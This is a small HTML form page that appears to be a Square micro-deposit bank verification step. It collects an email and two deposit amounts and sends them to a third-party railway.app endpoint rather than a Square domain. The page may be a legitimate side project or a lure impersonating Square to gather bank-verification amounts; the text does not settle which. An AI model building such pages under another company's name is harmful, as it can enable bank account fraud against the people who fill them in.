<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Verify Micro-Deposits – MR46</title>
<style>
body{font-family:Arial;max-width:520px;margin:40px auto;padding:20px;background:#f0f8ff;text-align:center}
input,button{width:100%;padding:14px;margin:10px 0;font-size:16px;border-radius:8px}
button{background:#006241;color:white;border:none;cursor:pointer}
#status{margin-top:20px;padding:15px;border-radius:8px;display:none;font-weight:bold}
.success{background:#d4edda;color:#155724}.error{background:#f8d7da;color:#721c24}
</style></head><body>
<h2 style="color:#006241">Verify Your Bank Account</h2>
<p>Enter the two exact deposit amounts you received from Square</p>
<input type="email" placeholder="Your email" id="e" required>
<input type="number" step="0.01" placeholder="First amount (e.g. 0.23)" id="a1" required>
<input type="number" step="0.01" placeholder="Second amount (e.g. 0.47)" id="a2" required>
<button onclick="v()">Verify & Save Bank</button>
<div id="status"></div>

<script>
async function v(){
  const a1=(parseFloat(document.getElementById('a1').value)*100).toFixed(0);
  const a2=(parseFloat(document.getElementById('a2').value)*100).toFixed(0);
  const email=document.getElementById('e').value;
  const r=await fetch('https://square-ach-mr46.up.railway.app/verify',{
    method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({email,amounts:[a1,a2]})
  });
  const j=await r.json();
  document.getElementById('status').style.display='block';
  document.getElementById('status').className=j.success?'success':'error';
  document.getElementById('status').textContent=j.success?'Bank verified & saved permanently! Ready for ACH payments.':'Wrong amounts – try again';
}
</script>
</body></html>
